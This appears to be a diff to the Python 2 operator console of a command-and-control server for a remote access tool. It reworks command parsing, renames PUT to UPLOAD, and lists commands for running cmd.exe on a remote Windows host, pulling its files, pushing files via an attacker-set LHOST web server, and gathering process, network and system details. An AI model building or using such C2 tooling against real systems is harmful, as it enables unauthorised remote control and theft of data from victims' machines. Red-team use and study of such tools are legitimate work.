@@ -150,91 +150,90 @@ def main():
             splitcmd = s.split(' ', 1)
             cmd = splitcmd[0].upper()
             args = ''
+            if len(splitcmd) > 1:
+                args = splitcmd[1]
 
             # Ignore empty commands
             if not cmd:
                 continue
 
-            # Two options for input commands
-            # 1) Full command is entered, i.e.: SHELL dir C:\
-            if len(splitcmd) > 1:
-                args = splitcmd[1]
+            # UPLOAD
+            if cmd == 'UPLOAD':
+                args = args.strip("\"")
 
-                # PUT
-                if cmd == 'PUT':
-                    args = args.strip("\"")
-
-                    # Check file existence
-                    if not os.path.exists(args):
-                        print 'File not found: %s' % args
-                        continue
-
-                    # Check if LHOST variable is set
-                    if 'LHOST' not in variables:
-                        print 'Variable LHOST not set'
-                        continue
-
-                    lhost = variables['LHOST']
-
-                    # Create folder if required
-                    if not os.path.exists('upload'):
-                        os.mkdir('upload')
-
-                    # Copy file
-                    filename = ntpath.basename(args)
-                    copyfile(args, './upload/%s' % filename)
-
-                    # Update command and args
-                    cmd = 'WGET'
-                    args = 'http://%s:%d/f/%s' % (lhost, PORT_NUMBER, filename)
-
-                # SET
-                elif cmd == 'SET':
-                    (variable, value) = args.split(' ')
-                    variables[variable.upper()] = value
+                # Check file existence
+                if not os.path.exists(args):
+                    print 'File not found: %s' % args
                     continue
 
-                # UNSET
-                elif cmd == 'UNSET':
-                    if args.upper() in variables:
-                        del variables[args.upper()]
+                # Check if LHOST variable is set
+                if 'LHOST' not in variables:
+                    print 'Variable LHOST not set'
                     continue
+                lhost = variables['LHOST']
 
-            # 2) Only context change, i.e.: SHELL
+                # Create folder if required
+                if not os.path.exists('upload'):
+                    os.mkdir('upload')
+
+                # Copy file
+                filename = ntpath.basename(args)
+                copyfile(args, './upload/%s' % filename)
+
+                # Update command and args
+                cmd = 'WGET'
+                args = 'http://%s:%d/f/%s' % (lhost, PORT_NUMBER, filename)
+
+            # UNSET
+            elif cmd == 'UNSET':
+                if args.upper() in variables:
+                    del variables[args.upper()]
+                continue
+
+            # SHELL
             elif cmd == 'SHELL':
                 context = 'SHELL'
                 continue
+
+            # SET
             elif cmd == 'SET':
-                print '\n'.join('%s: %s' % (key, value) for key,value in variables.iteritems())
+                if args:
+                    (variable, value) = args.split(' ')
+                    variables[variable.upper()] = value
+                else:
+                    print '\n'.join('%s: %s' % (key, value) for key,value in variables.iteritems())
                 continue
-            elif cmd == 'KILL' or cmd == 'SLEEP':
-                dummy = 'x'
+
+            # HELP
+            elif cmd == 'HELP':
+                print 'Supported commands:\n' \
+                      '- GET [path]         - Download the file at [path] to the .\\downloads folder.\n' \
+                      '- GETUID             - Get shell user id.\n' \
+                      '- HELP               - Show this help.\n' \
+                      '- IFCONFIG           - Show network configuration.\n' \
+                      '- KILL               - Stop script on the remote host.\n' \
+                      '- PS                 - Show process list.\n' \
+                      '- SET [name] [value] - Set a variable, for example SET LHOST 192.168.1.77.\n' \
+                      '                       When entered without parameters, it shows the currently set variables.\n' \
+                      '- SHELL [command]    - Execute command in cmd.exe interpreter;\n' \
+                      '                       When entered without command, switches to SHELL context.\n' \
+                      '- SHUTDOWN           - Exit this commandline interface (does not shutdown the client).\n' \
+                      '- SYSINFO            - Show sytem information.\n' \
+                      '- SLEEP [ms]         - Set client polling interval;\n' \
+                      '                       When entered without ms, shows the current interval.\n' \
+                      '- UNSET [name]       - Unset a variable\n' \
+                      '- UPLOAD [localpath] - Upload the file at [path] to the remote host.\n' \
+                      '                       Note: Variable LHOST is required.\n' \
+                      '- WGET [url]         - Download file from url.\n'
+                continue
+
+            # SHUTDOWN
             elif cmd == 'SHUTDOWN':
                 server.shutdown()
                 if os.path.exists('./upload'):
                     rmtree('./upload')
                 print 'Shutting down %s' % os.path.basename(__file__)
                 exit(0)
-            elif cmd == 'HELP':
-                print 'Supported commands:\n' \
-                      '- SLEEP [ms]         - Set client polling interval;\n' \
-                      '                       When entered without ms, shows the current interval.\n' \
-                      '- SHELL [command]    - Execute command in cmd.exe interpreter;\n' \
-                      '                       When entered without command, switches to SHELL context.\n' \
-                      '- GET [path]         - Download the file at [path] to the .\\downloads folder.\n' \
-                      '- PUT [localpath]    - Upload the file at [path] to the remote host.\n' \
-                      '                       Note: Variable LHOST is required.\n' \
-                      '- WGET [url]         - Download file from url.\n' \
-                      '- KILL               - Stop script on the remote host.\n' \
-                      '- SET [name] [value] - Set a variable, for example SET LHOST 192.168.1.77.\n' \
-                      '                       When entered without parameters, it shows the currently set variables.\n' \
-                      '- UNSET [name]       - Unset a variable\n' \
-                      '- SHUTDOWN           - Exit this commandline interface (does not shutdown the client).\n' \
-                      '- HELP               - Show this help.\n'
-                continue
-            else:
-                print '%s> Unknown command: %s' % (context, s)
-                continue
 
         commands.put(' '.join([cmd, args]))
 
